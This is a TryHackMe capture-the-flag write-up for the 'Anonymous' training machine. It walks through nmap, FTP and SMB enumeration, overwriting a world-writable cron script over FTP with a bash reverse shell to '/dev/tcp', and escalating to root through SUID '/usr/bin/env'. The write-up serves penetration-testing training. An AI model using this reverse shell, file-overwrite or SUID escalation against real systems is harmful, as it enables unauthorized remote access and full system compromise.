# Anonymous - TryHackme Walkthrough / Write Up
Report by: FJA 

Note: **This write up details a penetration testing conducted in a virtual system hosted on tryhackme.com . This system was designed for training**

**Tools used:**
```
nmap
nxc (NetExec)
steghide
GTFOBINS
```

# Executive Summary
***Anonymous***  is a virtual system hosted by the plataform TryHackMe. I've conducted a penetration testing with the goal of identifying vulnerabilities, attack vectors, exploiting vulnerabilities and gaining root access. Activies were conducted to simulate an attacker.

# Summary results
***Anonymous***Anonymous is classified as a medium-difficulty machine to compromise. The machine is vulnerable through the FTP service. A misconfiguration involving directory and file permissions is the starting point of the foothold. This behavior can be classified as a "Security Misconfiguration", in this case ``OWASP A05:2021``. It can also be classified as ``CWE-732``.
The machine also contains a vulnerable executable with SUID permissions, leading to full system compromise.
# Attack narrative

I started enumeration with the tool nmap:
```
nmap -p- -sCV 10.64.159.159 --min-rate 10000
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-15 19:44 -0300
Warning: 10.64.159.159 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.64.159.159
Host is up (0.15s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.192.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-09-15T22:45:34
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2026-09-15T22:45:34+00:00
```

The FTP port allows a anonymous login, and it reveals the user that's supposed to login
SMB ports also shows that a anonymous/guest login is allowed.

## Veryfing FTP
```
ftp 10.64.159.159                                                                                                                                                                                                        
Connected to 10.64.159.159.
220 NamelessOne's FTP Server!
Name (10.64.159.159:sa): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||64038|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||38895|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1118 Sep 15 22:50 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

**Notice the file permissions on ``'clean.sh'``, we can READ, WRITE and EXECUTE**, downloading all these files, we can now see the Bash script running inside of ``'clean.sh'``:

```
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

This is an if/else statement that checks the value of tmp_files and executes the corresponding commands. Its purpose seems to be deleting temporary files. If there are no new files in /tmp, an entry is added to removed_files.log. On the other hand, if there are new files, they are deleted and the action is logged in removed_files.log.
But the code it self is not important.

### On this part I've decided to enumerate more. I could have gained the initial foothold here

# SMB Enumeration:
```
nxc smb 10.64.159.159 --port 139  -u guest -p '' --shares
SMB         10.64.159.159   139    ANONYMOUS        [*] Unix - Samba (name:ANONYMOUS) (domain:) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         10.64.159.159   139    ANONYMOUS        [+] \guest: (Guest)
SMB         10.64.159.159   139    ANONYMOUS        [*] Enumerated shares
SMB         10.64.159.159   139    ANONYMOUS        Share           Permissions     Remark
SMB         10.64.159.159   139    ANONYMOUS        -----           -----------     ------
SMB         10.64.159.159   139    ANONYMOUS        print$                          Printer Drivers
SMB         10.64.159.159   139    ANONYMOUS        pics            READ            My SMB Share Directory for Pics
SMB         10.64.159.159   139    ANONYMOUS        IPC$                            IPC Service (anonymous server (Samba, Ubuntu))
```
This SMB share shows a directory named pics that have a READ permission, let's invesgate it:

```
smbclient //10.64.159.159/pics -U 'guest'
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 08:11:34 2020
  ..                                  D        0  Wed May 13 22:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 21:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 21:43:42 2020

                20508240 blocks of size 1024. 13306820 blocks available
smb: \> get corgo2.jpg 
gegetting file \corgo2.jpg of size 42663 as corgo2.jpg (44.3 KiloBytes/sec) (average 44.3 KiloBytes/sec)
smb: \> get puppos.jpeg 
getting file \puppos.jpeg of size 265188 as puppos.jpeg (215.1 KiloBytes/sec) (average 140.2 KiloBytes/sec)
```

### Forensics (Steghide)
I've verified the images using the command 'strings' and the tool 'steghide'. These images didn't hide a secret message, it only had shown the metadata of who's the photographer, website, date, programs. Steghide wasn't very useful, it required passwords, information was gathered through the UNIX command 'strings'

# Back to FTP

**Using the detail that we've identified earlier, we can search for a way to exploit that and overwrite the Bash script**
The FTP version 'vsftp 2.0.8' make the write permission by default, let's explore that! It can be searched in the internet.

### Crafting Exploit (Reverse Shell)

In our local machine, we'll be crafting a bash script, to be more specific, a reverse shell. We can use the website called 'revshells.com' to paste our reverse shell to our bash file.
**Note: Remember to verify your IP in the reverse shell, use the command ``ifconfig`` to do that.**

Now, we'll paste the reverse shell payload to our Bash script. There's a important detail here, we need to make our bash script as the same name of the FTP Bash script.
So, you can just edit the 'clean.sh' or delete the old one and create a new one.

## Delivering the Exploit
Now, we'll set up our listener.
Logging back to the FTP port, let's head to our script directory and overwrite the clean.sh

```
ftp 10.64.159.159                                                                                                                                                                                                        
Connected to 10.64.159.159.
220 NamelessOne's FTP Server!
Name (10.64.159.159:sa): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||38895|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1118 Sep 15 22:50 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
ftp> put clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||23182|)
150 Ok to send data.
100% |**********************************************************************************************************************************************************************************************|    54       35.22 KiB/s    00:00 ETA
226 Transfer complete.
54 bytes sent in 00:00 (0.12 KiB/s)
ftp> get clean.sh -
remote: clean.sh
229 Entering Extended Passive Mode (|||20014|)
150 Opening BINARY mode data connection for clean.sh (54 bytes).
#!/bin/bash

sh -i >& /dev/tcp/ip/900 0>&1

```

As we can see, the Bash script was successfully overwritten. Once the script is executed, we receive a shell through our listener.

# Privilege Escalation

As we got the first flag, let's upgrade our shell/stabilize it.
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
namelessone@anonymous:~$ ^Z
zsh: suspended  nc -nlvp 900

└─$ stty raw -echo; fg
[1]  + continued  nc -nlvp 900
```

* Verify for common privilege escalation methods

### SUID
Using the command ``find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null``, we can verify the SUIDs of the executables and their respective owners.

A weird directory pops up, called ``'/usr/bin/env'``

Searching it in GTFOBINS, we a find the command for it!
```
namelessone@anonymous:~$ env /bin/sh -p        
# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
**We can notice that our euid is now root! Now we can get our last flag.**

-------------------------------------------------------------------------------------------------
# Conclusion

This room was honestly easy. I completed almost everything on my own, but I got a little stuck on the FTP file overwrite.

I identified the security flaw myself, but I had some difficulties figuring out how to overwrite the file and turn that into code execution.

The room was a good exercise in FTP enumeration, Linux permissions, SMB enumeration, shell access, and SUID-based privilege escalation.

## Checkout other writeups!
